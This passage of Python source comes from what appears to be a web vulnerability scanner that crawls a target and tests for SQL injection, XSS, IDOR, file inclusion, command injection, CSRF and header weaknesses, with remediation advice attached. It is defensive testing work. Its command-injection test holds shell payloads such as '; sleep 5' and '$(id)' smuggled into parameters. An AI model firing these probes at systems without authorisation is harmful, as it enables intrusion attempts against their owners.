            name: asyncio.create_task(_guarded(name, coro))
            for name, coro in module_map.items()
            if self._module_enabled(name)
        }

        all_findings: list[WebFinding] = []
        results = await asyncio.gather(*active.values(), return_exceptions=True)
        for findings in results:
            if isinstance(findings, list):
                all_findings.extend(findings)

        # ── Phase 3: Run external tools if available ──────────────────────
        tool_outputs = await self._run_external_tools(target_url, surface)

        # ── Phase 4: Deduplicate and score ────────────────────────────────
        min_conf = self._cfg.get("reporting", {}).get("min_confidence_threshold", 0.3)
        all_findings = [f for f in all_findings if f.confidence >= min_conf]
        all_findings = self._deduplicate(all_findings)

        # ── Phase 5: Evidence-gated validation ───────────────────────────────
        try:
            from modules.web_validation_agent import WebValidationAgent
            async with self._make_client() as val_client:
                get_fn  = lambda url, headers=None, params=None: self._get(
                    val_client, url, params=params, headers=headers
                )
                post_fn = lambda url, data=None, json_=None, headers=None: self._post(
                    val_client, url, data=data, json_=json_, headers=headers
                )
                agent = WebValidationAgent(
                    get_fn=get_fn, post_fn=post_fn, kill_fn=self._check_kill
                )
                all_findings = await agent.validate_all(all_findings, surface)
        except Exception as exc:
            logger.warning("Validation agent failed (non-fatal): %s", exc)

        # ── Phase 6: LLM agent reasoning (optional) ───────────────────────
        llm_result = None
        llm_cfg    = self._cfg.get("llm", {})
        if llm_cfg.get("enabled", False):
            try:
                from modules.web_llm_agent import WebLLMAgent
                async with self._make_client() as llm_client:
                    _get_fn  = lambda url, headers=None, params=None: self._get(
                        llm_client, url, params=params, headers=headers
                    )
                    _post_fn = lambda url, data=None, json_=None, headers=None: self._post(
                        llm_client, url, data=data, json_=json_, headers=headers
                    )
                    llm_agent  = WebLLMAgent(config=llm_cfg)
                    llm_result = await llm_agent.run(
                        engine=self,
                        surface=surface,
                        findings=all_findings,
                        get_fn=_get_fn,
                        post_fn=_post_fn,
                        kill_fn=self._check_kill,
                    )
                    if llm_result.additional_findings:
                        all_findings.extend(llm_result.additional_findings)
                        all_findings = self._deduplicate(all_findings)
                        logger.info(
                            "LLM agent added %d new findings",
                            len(llm_result.additional_findings),
                        )
            except Exception as exc:
                logger.warning("LLM agent failed (non-fatal): %s", exc)

        ended_at = time.time()
        summary  = self._compute_summary(all_findings, started_at, ended_at, surface)

        logger.info(
            "=== WEB VAPT SESSION %s END | findings=%d (advanced=%d) risk_score=%.1f dur=%.1fs ===",
            self._session_id,
            len(all_findings),
            self._advanced_module_findings,
            summary.risk_score,
            ended_at - started_at,
        )

        return WebAssessmentResult(
            session_id    = self._session_id,
            target_url    = target_url,
            started_at    = started_at,
            ended_at      = ended_at,
            findings      = all_findings,
            summary       = summary,
            attack_surface= {
                "urls":       surface.urls[:50],
                "forms":      len(surface.forms),
                "parameters": {u: ps for u, ps in list(surface.parameters.items())[:20]},
                "technologies": surface.technologies,
                "js_files":   surface.js_files[:20],
                "api_endpoints": surface.api_endpoints[:20],
                "graphql_endpoints": surface.graphql_endpoints[:10],
                "websocket_endpoints": surface.websocket_endpoints[:10],
                "wasm_files": surface.wasm_files[:10],
                "service_workers": surface.service_workers[:10],
                "import_maps": surface.import_maps[:5],
            },
            tool_outputs  = tool_outputs,
            errors        = list(self._errors),
            llm_result    = llm_result,
        )

    # =========================================================================
    # Attack Surface Discovery
    # =========================================================================

    async def discover_attack_surface(self, url: str) -> AttackSurface:
        """
        Crawl *url*, extract forms, parameters, links, technologies,
        and 2026-specific attack surface elements (WASM files, import maps,
        service workers, WebSocket endpoints, GraphQL endpoints, cache headers).
        """
        cfg = self._cfg.get("crawl", {})
        max_urls   = cfg.get("max_urls", 250)
        max_depth  = cfg.get("max_depth", 5)

        visited:    set[str]              = set()
        queue:      list[tuple[str, int]] = [(url, 0)]
        forms:      list[dict[str, Any]]  = []
        parameters: dict[str, list[str]]  = {}
        js_files:   list[str]             = []
        wasm_files: list[str]             = []
        techs:      list[str]             = []
        resp_headers: dict[str, str]      = {}
        cookies_seen: list[dict[str, Any]]   = []
        api_eps:    list[str]             = []
        graphql_eps:list[str]             = []
        ws_eps:     list[str]             = []
        sw_files:   list[str]             = []
        import_maps:list[str]             = []
        cache_headers: dict[str, list[str]] = {}

        skip_ext_re = re.compile(
            r"\.(pdf|jpg|jpeg|png|gif|ico|woff2?|ttf|eot|mp4|mp3|zip|tar|gz|bz2)$",
            re.I,
        )

        ws_pattern = re.compile(
            r"new\s+WebSocket\(['\"]([^'\"]+)['\"]|wss?://[^'\")>\s]+",
            re.I,
        )

        async with self._make_client() as client:
            while queue and len(visited) < max_urls:
                if self._check_kill():
                    break
                cur_url, depth = queue.pop(0)
                if cur_url in visited or depth > max_depth:
                    continue
                if skip_ext_re.search(urlparse(cur_url).path):
                    visited.add(cur_url)
                    continue
                visited.add(cur_url)

                resp = await self._get(client, cur_url)
                if resp is None:
                    continue

                if not resp_headers:
                    resp_headers = dict(resp.headers)
                    techs = self._detect_technologies(resp_headers, resp.text or "")
                    for name, val in resp.cookies.items():
                        cookies_seen.append({
                            "name":      name,
                            "value":     val[:20] + "..." if len(val) > 20 else val,
                            "httponly":  "httponly" in str(resp.headers.get("set-cookie", "")).lower(),
                            "secure":    "secure"   in str(resp.headers.get("set-cookie", "")).lower(),
                            "samesite":  self._extract_samesite(resp.headers.get("set-cookie", "")),
                        })

                # Extract cache-related headers
                for hdr in ("cache-control", "pragma", "expires", "age", "cf-cache-status"):
                    val = resp.headers.get(hdr, "")
                    if val:
                        cache_headers.setdefault(hdr, []).append(val)

                # Extract query parameters
                parsed = urlparse(cur_url)
                qp     = parse_qs(parsed.query, keep_blank_values=True)
                if qp:
                    parameters[cur_url] = list(qp.keys())

                body = resp.text or ""
                ct = resp.headers.get("content-type", "")

                if "html" in ct:
                    parser = _LinkFormExtractor()
                    parser.feed(body)

                    for link in parser.links:
                        abs_link = urljoin(cur_url, link)
                        pl = urlparse(abs_link)
                        bu = urlparse(url)
                        if pl.netloc == bu.netloc and abs_link not in visited:
                            queue.append((abs_link, depth + 1))
                            lqp = parse_qs(pl.query, keep_blank_values=True)
                            if lqp:
                                parameters[abs_link] = list(lqp.keys())

                    for form in parser.forms:
                        action = urljoin(cur_url, form["action"]) if form["action"] else cur_url
                        form["resolved_action"] = action
                        forms.append(form)

                    for script in parser.scripts:
                        js_files.append(urljoin(cur_url, script))

                    wasm_files.extend(
                        urljoin(cur_url, w) for w in parser.wasm_files
                    )
                    sw_files.extend(
                        urljoin(cur_url, s) for s in parser.service_workers
                    )
                    import_maps.extend(parser.import_maps)

                    # Detect WebSocket endpoints in JS/HTML
                    for match in ws_pattern.findall(body):
                        if match and match.startswith(("ws://", "wss://")):
                            ws_eps.append(match)
                        elif match and match.startswith("/"):
                            ws_eps.append(urljoin(cur_url, match))

                # Detect API-like endpoints
                path_lower = parsed.path.lower()
                if any(s in path_lower for s in ("/api/", "/v1/", "/v2/", "/v3/", "/rest/", "/graphql")):
                    api_eps.append(cur_url)
                if "/graphql" in path_lower or "/gql" in path_lower:
                    graphql_eps.append(cur_url)

        # Run katana for deeper JS-rendered crawl
        katana_urls = await self._run_katana(url)
        for ku in katana_urls:
            if ku not in visited:
                visited.add(ku)
                parsed = urlparse(ku)
                qp     = parse_qs(parsed.query, keep_blank_values=True)
                if qp:
                    parameters[ku] = list(qp.keys())
                if "/graphql" in parsed.path.lower():
                    graphql_eps.append(ku)

        all_urls = list(visited)
        logger.info(
            "discover_attack_surface complete | urls=%d forms=%d params=%d "
            "js=%d wasm=%d graphql=%d ws=%d sw=%d import_maps=%d",
            len(all_urls), len(forms),
            sum(len(v) for v in parameters.values()),
            len(js_files), len(wasm_files), len(graphql_eps),
            len(ws_eps), len(sw_files), len(import_maps),
        )

        return AttackSurface(
            base_url       = url,
            urls           = all_urls,
            forms          = forms,
            parameters     = parameters,
            cookies        = cookies_seen,
            headers        = resp_headers,
            technologies   = list(set(techs)),
            js_files       = list(set(js_files)),
            api_endpoints  = list(set(api_eps)),
            graphql_endpoints = list(set(graphql_eps)),
            websocket_endpoints = list(set(ws_eps)),
            wasm_files     = list(set(wasm_files)),
            service_workers = list(set(sw_files)),
            import_maps    = import_maps,
            cache_headers  = cache_headers,
        )

    @staticmethod
    def _detect_technologies(headers: dict[str, str], body: str) -> list[str]:
        techs: list[str] = []
        srv = headers.get("server", "").lower()
        xpb = headers.get("x-powered-by", "").lower()
        if "nginx"     in srv: techs.append("nginx")
        if "apache"    in srv: techs.append("Apache")
        if "iis"       in srv: techs.append("IIS")
        if "express"   in xpb: techs.append("Express.js")
        if "php"       in xpb: techs.append("PHP")
        if "asp.net"   in xpb: techs.append("ASP.NET")
        if "wordpress" in body.lower(): techs.append("WordPress")
        if "joomla"    in body.lower(): techs.append("Joomla")
        if "drupal"    in body.lower(): techs.append("Drupal")
        if "react"     in body.lower(): techs.append("React")
        if "angular"   in body.lower(): techs.append("Angular")
        if "vue"       in body.lower(): techs.append("Vue.js")
        if "svelte"    in body.lower(): techs.append("Svelte")
        if "next"      in body.lower(): techs.append("Next.js")
        if "nuxt"      in body.lower(): techs.append("Nuxt.js")
        if "remix"     in body.lower(): techs.append("Remix")
        if "sveltekit" in body.lower(): techs.append("SvelteKit")
        if "solid"     in body.lower(): techs.append("Solid.js")
        if "deno"      in body.lower(): techs.append("Deno")
        if "bun"       in body.lower(): techs.append("Bun")
        if "webassembly" in body.lower() or ".wasm" in body.lower(): techs.append("WebAssembly")
        if "cloudflare" in srv or "cloudflare" in xpb: techs.append("Cloudflare")
        if "fastly"    in srv: techs.append("Fastly")
        if "akamai"    in srv: techs.append("Akamai")
        return techs

    @staticmethod
    def _extract_samesite(set_cookie: str) -> str:
        m = re.search(r"samesite=(\w+)", set_cookie, re.I)
        return m.group(1).capitalize() if m else "None"

    # =========================================================================
    # SQL Injection Tests
    # =========================================================================

    async def run_sqli_tests(self, surface: AttackSurface) -> list[WebFinding]:
        """
        Detect SQL injection via a multi-stage, evidence-gated pipeline.

        A finding is only raised when direct database evidence exists (DB error
        fingerprint, consistent boolean differential, or timing confirmation).
        Frontend validation errors, WAF blocks, and generic HTTP errors are
        suppressed. Delegates to SQLiDetectionEngine for all detection logic.
        """
        from modules.sqli_engine import SQLiDetectionEngine

        engine = SQLiDetectionEngine(
            technologies=surface.technologies,
            timing_threshold=self._timing_thresh,
            finding_factory=self._finding,
        )

        findings: list[WebFinding] = []

        async with self._make_client() as client:
            get_fn  = lambda url, params=None: self._get(client, url, params=params)
            post_fn = lambda url, data=None:   self._post(client, url, data=data)

            # ── GET parameter scanning ────────────────────────────────────
            for url, params in surface.parameters.items():
                if self._check_kill():
                    break
                for param in params:
                    if self._check_kill():
                        break
                    async with self._sem:
                        await self._limiter.acquire()
                        hits = await engine.scan_param(
                            get_fn, url, param, self._check_kill
                        )
                    findings.extend(hits)

            # ── Form field scanning ───────────────────────────────────────
            for form in surface.forms:
                if self._check_kill():
                    break
                action = form["resolved_action"]
                method = form["method"]
                inputs = form["inputs"]
                base_data = {i["name"]: i["value"] for i in inputs}
                for inp in inputs:
                    if inp["type"] in ("submit", "button", "hidden", "image"):
                        continue
                    if self._check_kill():
                        break
                    async with self._sem:
                        await self._limiter.acquire()
                        hits = await engine.scan_form_field(
                            get_fn, post_fn,
                            action, method, inp["name"], base_data,
                            self._check_kill,
                        )
                    findings.extend(hits)

        return findings

    # =========================================================================
    # XSS Tests
    # =========================================================================

    async def run_xss_tests(self, surface: AttackSurface) -> list[WebFinding]:
        """Detect reflected XSS via unique-marker reflection testing."""
        findings: list[WebFinding] = []

        async with self._make_client() as client:
            for url, params in surface.parameters.items():
                if self._check_kill():
                    break
                for param in params:
                    marker = f"xss{uuid.uuid4().hex[:10]}"
                    probe  = f"<{marker}>"
                    resp   = await self._get(client, url, params={param: probe})
                    if resp is None:
                        continue
                    ct = resp.headers.get("content-type", "")
                    if "html" not in ct:
                        continue
                    if probe in resp.text:
                        ctx = self._detect_xss_context(resp.text, probe)
                        f_ = self._finding(
                            "xss",
                            f"Reflected XSS — {param}",
                            WebRiskLevel.MEDIUM,
                            0.55,
                            url, param,
                            f"The unique marker '{probe}' was reflected in the HTML response "
                            f"without encoding in context: {ctx}. Execution not yet confirmed.",
                            f"Marker '{probe}' found unencoded in {ctx} context",
                            "HTML-encode all user input before reflection. "
                            "Implement a strict Content-Security-Policy. "
                            "Use framework templating engines that auto-escape output.",
                            ["https://owasp.org/www-community/attacks/xss/",
                             "https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html"],
                            cvss_score=5.4,
                        )
                        # Preserve detected context so the validator can confirm execution
                        f_.comparison_result = (
                            f"Baseline: no marker present. "
                            f"Attack: '{probe}' reflected unencoded in {ctx} context."
                        )
                        findings.append(f_)
                    elif marker in resp.text:
                        findings.append(self._finding(
                            "xss",
                            f"Partial XSS Reflection (Tag stripped) — {param}",
                            WebRiskLevel.MEDIUM,
                            0.55,
                            url, param,
                            "Marker text reflected but HTML tags were stripped, "
                            "suggesting partial sanitisation that may be bypassable.",
                            f"Marker text (without tags) found in response for param '{param}'",
                            "Use a context-aware output encoding library. "
                            "Allowlist rather than denylist input characters.",
                            ["https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html"],
                            cvss_score=5.4,
                        ))

            # CSP analysis
            csp = surface.headers.get("content-security-policy", "")
            if not csp:
                findings.append(self._finding(
                    "xss",
                    "Missing Content-Security-Policy Header",
                    WebRiskLevel.MEDIUM,
                    1.0,
                    surface.base_url, "",
                    "No Content-Security-Policy header is present. "
                    "CSP provides an important additional layer of defence against XSS.",
                    "CSP header absent from server response",
                    "Define a strict CSP. Start with "
                    "default-src 'self'; script-src 'self'; and tighten progressively.",
                    ["https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP"],
                    cvss_score=5.3,
                ))
            elif "unsafe-inline" in csp:
                findings.append(self._finding(
                    "xss",
                    "Content-Security-Policy Allows 'unsafe-inline'",
                    WebRiskLevel.MEDIUM,
                    1.0,
                    surface.base_url, "",
                    "The CSP permits 'unsafe-inline' scripts, significantly weakening "
                    "XSS protections.",
                    f"CSP: {csp[:200]}",
                    "Remove 'unsafe-inline' from CSP. Use nonces or hashes for inline scripts.",
                    ["https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP"],
                    cvss_score=5.3,
                ))

            # Form XSS
            for form in surface.forms:
                if self._check_kill():
                    break
                action = form["resolved_action"]
                method = form["method"]
                for inp in form["inputs"]:
                    if inp["type"] in ("submit", "button", "hidden", "image", "password"):
                        continue
                    marker = f"xss{uuid.uuid4().hex[:10]}"
                    probe  = f"<{marker}>"
                    data   = {i["name"]: i["value"] for i in form["inputs"]}
                    data[inp["name"]] = probe
                    resp = await (self._post(client, action, data=data)
                                  if method == "POST"
                                  else self._get(client, action, params=data))
                    if resp and probe in resp.text and "html" in resp.headers.get("content-type", ""):
                        ctx = self._detect_xss_context(resp.text, probe)
                        f_ = self._finding(
                            "xss",
                            f"Reflected XSS via Form — {inp['name']}",
                            WebRiskLevel.MEDIUM,
                            0.55,
                            action, inp["name"],
                            "Form field value reflected unencoded in HTML response. "
                            "Execution not yet confirmed — manual validation required.",
                            f"Marker '{probe}' returned unencoded in {ctx} context via form",
                            "HTML-encode all user-controlled values before rendering.",
                            ["https://owasp.org/www-community/attacks/xss/"],
                            cvss_score=5.4,
                        )
                        f_.comparison_result = (
                            f"Baseline: no marker present. "
                            f"Attack: '{probe}' reflected unencoded in {ctx} context via form field."
                        )
                        findings.append(f_)

        return findings

    @staticmethod
    def _detect_xss_context(html: str, marker: str) -> str:
        idx = html.find(marker)
        if idx == -1:
            return "unknown"
        snippet = html[max(0, idx - 50):idx + len(marker) + 10]
        if re.search(r"<script[^>]*>[^<]*$", snippet, re.I | re.S):
            return "JavaScript"
        if re.search(r'<[a-z]+[^>]*\s[a-z-]+=["\']\s*$', snippet, re.I):
            return "HTML attribute"
        if re.search(r"href\s*=\s*['\"]?\s*$", snippet, re.I):
            return "URL attribute"
        return "HTML body"

    # =========================================================================
    # IDOR Tests
    # =========================================================================

    async def run_idor_tests(self, surface: AttackSurface) -> list[WebFinding]:
        """
        Detect IDOR by identifying numeric IDs in URLs and checking if
        adjacent IDs return different user-scoped resources.
        """
        findings: list[WebFinding] = []
        id_pattern = re.compile(r"/(\d{1,10})(?:[/?#]|$)")

        candidate_urls: list[tuple[str, int]] = []
        for url in surface.urls:
            for m in id_pattern.finditer(urlparse(url).path):
                candidate_urls.append((url, int(m.group(1))))

        if not candidate_urls:
            return findings

        async with self._make_client() as client:
            for url, oid in candidate_urls[:10]:
                if self._check_kill():
                    break
                r_orig = await self._get(client, url)
                if r_orig is None or r_orig.status_code != 200:
                    continue

                alt_id  = oid + 1
                alt_url = url.replace(f"/{oid}", f"/{alt_id}", 1)
                r_alt   = await self._get(client, alt_url)

                if r_alt and r_alt.status_code == 200:
                    orig_len = len(r_orig.text)
                    alt_len  = len(r_alt.text)
                    if abs(orig_len - alt_len) < orig_len * 0.3:
                        findings.append(self._finding(
                            "idor",
                            f"Potential IDOR — Sequential ID in URL",
                            WebRiskLevel.HIGH,
                            0.65,
                            url, "(id in path)",
                            f"Resource with id={oid} and id={alt_id} both returned HTTP 200 "
                            "with similar-sized responses. This may indicate horizontal "
                            "privilege escalation if resources are user-scoped.",
                            f"URL {url} (len={orig_len}) and {alt_url} (len={alt_len}) "
                            "both accessible",
                            "Enforce server-side authorization checks on every resource access. "
                            "Use indirect object references (UUIDs) instead of sequential integers. "
                            "Validate that the requesting user owns the requested resource.",
                            ["https://owasp.org/www-community/attacks/Insecure_Direct_Object_Reference"],
                            cvss_score=6.5,
                        ))

        return findings

    # =========================================================================
    # LFI / Path Traversal Tests
    # =========================================================================

    async def run_lfi_tests(self, surface: AttackSurface) -> list[WebFinding]:
        """Detect Local File Inclusion via path traversal payloads."""
        findings: list[WebFinding] = []
        payloads  = self._load_payloads("lfi")[: self._max_payloads("lfi", 25)]
        if not payloads:
            return findings

        lfi_params = re.compile(
            r"^(file|path|page|include|template|load|read|view|src|source|"
            r"doc|document|folder|dir|root|base)$",
            re.I,
        )

        async with self._make_client() as client:
            for url, params in surface.parameters.items():
                if self._check_kill():
                    break
                for param in params:
                    if not lfi_params.match(param):
                        continue
                    for pl in payloads[:8]:
                        if self._check_kill():
                            break
                        resp = await self._get(client, url, params={param: pl})
                        if resp and _LFI_INDICATOR_RE.search(resp.text):
                            findings.append(self._finding(
                                "lfi",
                                f"Local File Inclusion — {param}",
                                WebRiskLevel.CRITICAL,
                                0.92,
                                url, param,
                                "Path traversal payload returned system file content, "
                                "indicating Local File Inclusion vulnerability.",
                                f"Payload '{pl}' returned indicator pattern in response",
                                "Validate and sanitise file paths. Use a whitelist of permitted "
                                "filenames. Resolve paths and confirm they are within an allowed "
                                "base directory. Disable allow_url_fopen in PHP.",
                                ["https://owasp.org/www-community/attacks/Path_Traversal",
                                 "https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion"],
                                cvss_score=9.1,
                            ))
                            break

        return findings

    # =========================================================================
    # RFI Tests
    # =========================================================================

    async def run_rfi_tests(self, surface: AttackSurface) -> list[WebFinding]:
        """Detect Remote File Inclusion patterns in URL-accepting parameters."""
        findings: list[WebFinding] = []

        rfi_params = re.compile(
            r"^(url|uri|link|src|source|include|file|load|fetch|remote|resource)$",
            re.I,
        )

        async with self._make_client() as client:
            for url, params in surface.parameters.items():
                if self._check_kill():
                    break
                for param in params:
                    if not rfi_params.match(param):
                        continue
                    probe_url = "http://169.254.0.1/rfi-test"
                    resp = await self._get(client, url, params={param: probe_url})
                    if resp is None:
                        continue
                    if resp.elapsed.total_seconds() > 3.0 and resp.status_code in (200, 500):
                        findings.append(self._finding(
                            "rfi",
                            f"Possible Remote File Inclusion — {param}",
                            WebRiskLevel.HIGH,
                            0.55,
                            url, param,
                            f"Parameter '{param}' appears to accept URLs and caused a "
                            f"{resp.elapsed.total_seconds():.1f}s delay when a remote URL "
                            "was supplied, suggesting server-side URL fetching (potential RFI/SSRF).",
                            f"Param '{param}' with remote URL caused {resp.elapsed.total_seconds():.1f}s delay",
                            "Validate and sanitise all URL parameters. Use an allowlist of "
                            "permitted schemes and hosts. Disable PHP allow_url_include.",
                            ["https://owasp.org/www-community/attacks/Remote_File_Inclusion",
                             "https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.2-Testing_for_Remote_File_Inclusion"],
                            cvss_score=8.8,
                        ))

        return findings

    # =========================================================================
    # Command Injection Tests
    # =========================================================================

    async def run_command_injection_tests(self, surface: AttackSurface) -> list[WebFinding]:
        """Detect OS command injection via timing-based, output-based, and OOB probes."""
        findings: list[WebFinding] = []

        ci_params = re.compile(
            r"^(cmd|command|exec|execute|ping|host|ip|address|query|run|"
            r"input|value|data|param|name|user|pass|search)$",
            re.I,
        )
        timing_payloads = ["; sleep 5", "| sleep 5", "& sleep 5", "`sleep 5`", "$(sleep 5)"]
        output_payloads = ["; id", "| id", "& id", "`id`", "$(id)"]

        async with self._make_client() as client:
            for url, params in surface.parameters.items():
                if self._check_kill():
                    break
                for param in params:
                    for pl in output_payloads:
                        if self._check_kill():
                            break
                        resp = await self._get(client, url, params={param: f"test{pl}"})
                        if resp and _CMD_OUTPUT_RE.search(resp.text):
                            findings.append(self._finding(
                                "command_injection",
                                f"OS Command Injection (Output-Based) — {param}",
                                WebRiskLevel.CRITICAL,
                                0.93,
                                url, param,
                                "Command output (uid/gid pattern) was returned in the response, "
                                "confirming OS command injection.",
                                f"Payload 'test{pl}' returned command output",
                                "Never pass user input to shell commands. Use library functions "
                                "instead of shell calls. Apply strict input validation.",
                                ["https://owasp.org/www-community/attacks/Command_Injection",
                                 "https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html"],
                                cvss_score=10.0,
                            ))
                            break

                    if ci_params.match(param):
                        for pl in timing_payloads:
                            t0   = time.monotonic()
                            resp = await self._get(client, url, params={param: f"test{pl}"})
                            dt   = time.monotonic() - t0
                            if resp and dt >= self._timing_thresh:
                                findings.append(self._finding(
                                    "command_injection",
                                    f"OS Command Injection (Time-Based) — {param}",
                                    WebRiskLevel.CRITICAL,
                                    0.78,
                                    url, param,
                                    f"Response delayed {dt:.1f}s when sleep payload was injected.",
                                    f"Payload 'test{pl}' caused {dt:.1f}s delay",
                                    "Never concatenate user input into shell commands. "
                                    "Use parameterised API calls or strict allowlists.",
                                    ["https://owasp.org/www-community/attacks/Command_Injection"],
                                    cvss_score=9.8,
                                ))
                                break

        return findings

    # =========================================================================
    # CSRF Tests
    # =========================================================================

    async def run_csrf_tests(self, surface: AttackSurface) -> list[WebFinding]:
        """
        Check for missing CSRF tokens in state-changing forms and
        insecure SameSite cookie configurations.
        """
        findings: list[WebFinding] = []

        csrf_token_names = re.compile(
            r"csrf|_token|xsrf|authenticity_token|state|nonce|anti_forgery",
            re.I,
        )

        for form in surface.forms:
            if form["method"] != "POST":
                continue
            has_token = any(csrf_token_names.search(inp["name"]) for inp in form["inputs"])
            if not has_token:
                f_ = self._finding(
                    "csrf",
                    f"Missing CSRF Token — {form['resolved_action']}",
                    WebRiskLevel.MEDIUM,
                    0.50,
                    form["resolved_action"], "",
                    "A POST form was found without any detectable CSRF token field. "
                    "UNVERIFIED — confirmation requires a tokenless submission to succeed "
                    "on a victim session context.",
                    f"POST form at '{form['resolved_action']}' has no CSRF token field. "
                    f"Fields: {[i['name'] for i in form['inputs']]}",
                    "Add a cryptographically random CSRF token to every state-changing form. "
                    "Validate the token server-side on every POST/PUT/DELETE request. "
                    "Use the SameSite=Strict or SameSite=Lax cookie attribute.",
                    ["https://owasp.org/www-community/attacks/csrf",
                     "https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html"],
                    cvss_score=4.3,
                )
                f_.comparison_result = (
                    "Baseline: form inputs present. "
                    f"Observation: no CSRF token field found in {[i['name'] for i in form['inputs']]}. "
                    "Exploit requires: tokenless POST succeeds with state change on victim session."
                )
                findings.append(f_)

        for cookie in surface.cookies:
            samesite = cookie.get("samesite", "None")
            if samesite.lower() in ("none", ""):
                findings.append(self._finding(
                    "csrf",
                    f"Cookie Missing SameSite Attribute — {cookie['name']}",
                    WebRiskLevel.MEDIUM,
                    0.90,
                    surface.base_url, cookie["name"],
                    f"Cookie '{cookie['name']}' does not have the SameSite attribute set "
                    "(or is SameSite=None), making it vulnerable to CSRF attacks.",
                    f"Cookie '{cookie['name']}' SameSite={samesite}",
                    "Set SameSite=Lax (minimum) or SameSite=Strict on all session cookies. "
                    "Use SameSite=None only for cross-site cookies that require HTTPS + Secure.",
                    ["https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies#samesite_cookies"],
                    cvss_score=4.3,
                ))

        return findings

    # =========================================================================
    # Authentication / Session Tests
    # =========================================================================

    async def run_auth_tests(self, surface: AttackSurface) -> list[WebFinding]:
        """Check for auth weaknesses: insecure cookies, missing flags, session info leakage."""
        findings: list[WebFinding] = []

        for cookie in surface.cookies:
            name = cookie["name"].lower()
            if any(s in name for s in ("session", "sessid", "auth", "token", "jwt", "user")):
                if not cookie.get("httponly"):
                    findings.append(self._finding(
                        "auth",
                        f"Session Cookie Missing HttpOnly — {cookie['name']}",
                        WebRiskLevel.MEDIUM,
                        0.95,
                        surface.base_url, cookie["name"],
                        f"Session-related cookie '{cookie['name']}' lacks the HttpOnly flag, "
                        "making it readable by JavaScript (XSS risk).",
                        f"Cookie '{cookie['name']}' HttpOnly=False",
                        "Set the HttpOnly flag on all session and authentication cookies.",
                        ["https://owasp.org/www-community/HttpOnly"],
                        cvss_score=5.4,
                    ))
                if not cookie.get("secure") and urlparse(surface.base_url).scheme == "https":
                    findings.append(self._finding(
                        "auth",
                        f"Session Cookie Missing Secure Flag — {cookie['name']}",
                        WebRiskLevel.MEDIUM,
                        0.90,
                        surface.base_url, cookie["name"],
                        f"Session-related cookie '{cookie['name']}' lacks the Secure flag "
                        "on an HTTPS site, meaning it could be transmitted over HTTP.",
                        f"Cookie '{cookie['name']}' Secure=False on HTTPS",
                        "Set the Secure flag on all session and authentication cookies served over HTTPS.",
                        ["https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies#secure_cookies"],
                        cvss_score=4.3,
                    ))

        server = surface.headers.get("server", "")
        xpb    = surface.headers.get("x-powered-by", "")
        if server and server.lower() not in ("", "server"):
            findings.append(self._finding(
                "auth",
                "Server Version Disclosure in Header",
                WebRiskLevel.LOW,
                0.95,
                surface.base_url, "Server",
                f"The 'Server' header discloses server software and version: '{server}'. "
                "This aids fingerprinting for targeted attacks.",
                f"Server: {server}",
                "Configure the server to emit a generic 'Server' header or omit it entirely.",
                ["https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/01-Information_Gathering/02-Fingerprint_Web_Server"],
                cvss_score=2.7,
            ))
        if xpb:
            findings.append(self._finding(
                "auth",
                "Technology Disclosure via X-Powered-By Header",
                WebRiskLevel.LOW,
                0.95,
                surface.base_url, "X-Powered-By",
                f"'X-Powered-By: {xpb}' discloses the application framework/runtime version.",
                f"X-Powered-By: {xpb}",
                "Remove or suppress the X-Powered-By header in server/framework configuration.",
                [],
                cvss_score=2.7,
            ))

        return findings

    # =========================================================================
    # File Upload Tests
    # =========================================================================

    async def run_file_upload_tests(self, surface: AttackSurface) -> list[WebFinding]:
        """Detect potentially insecure file upload endpoints."""
        findings: list[WebFinding] = []

        upload_forms = [
            f for f in surface.forms
            if f.get("enctype", "").lower() == "multipart/form-data"
            or any(i["type"] == "file" for i in f["inputs"])
        ]

        for form in upload_forms:
            action     = form["resolved_action"]
            file_input = next((i for i in form["inputs"] if i["type"] == "file"), None)
            if file_input is None:
                continue

            findings.append(self._finding(
                "file_upload",
                f"File Upload Endpoint Detected — {action}",
                WebRiskLevel.MEDIUM,
                0.70,
                action, file_input["name"],
                "A file upload form was detected. If server-side validation of file type, "
                "extension, and content is insufficient, attackers may upload executable files.",
                f"Form at '{action}' accepts file uploads via field '{file_input['name']}'",
                "Validate file type by content (magic bytes), not just extension or MIME type. "
                "Store uploads outside the web root. Rename files server-side. "
                "Scan uploads for malware. Restrict file size.",
                ["https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload",
                 "https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html"],
                cvss_score=7.5,
            ))

        return findings

    # =========================================================================
    # Security Header Analysis
    # =========================================================================

    async def run_header_analysis(self, surface: AttackSurface) -> list[WebFinding]:
        """Audit HTTP response headers for missing or misconfigured security headers."""
        findings: list[WebFinding] = []
        hdrs = {k.lower(): v for k, v in surface.headers.items()}

        required_headers = {
            "strict-transport-security": (
                WebRiskLevel.MEDIUM, 0.85,
                "Missing HTTP Strict Transport Security (HSTS)",
                "The HSTS header is absent. Without HSTS, browsers may allow HTTP downgrade "
                "attacks if an active MITM is present. Not directly exploitable without network access.",
                "Add: Strict-Transport-Security: max-age=31536000; includeSubDomains; preload",
                5.4, "https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Strict-Transport-Security",
            ),
            "x-frame-options": (
                WebRiskLevel.MEDIUM, 0.98,
                "Missing X-Frame-Options Header",
                "Absent X-Frame-Options allows the page to be embedded in iframes (clickjacking risk).",
                "Add: X-Frame-Options: DENY or SAMEORIGIN. Prefer CSP frame-ancestors directive.",
                4.3, "https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options",
            ),
            "x-content-type-options": (
                WebRiskLevel.LOW, 0.98,
                "Missing X-Content-Type-Options Header",
                "Without nosniff, browsers may MIME-sniff responses, enabling content injection.",
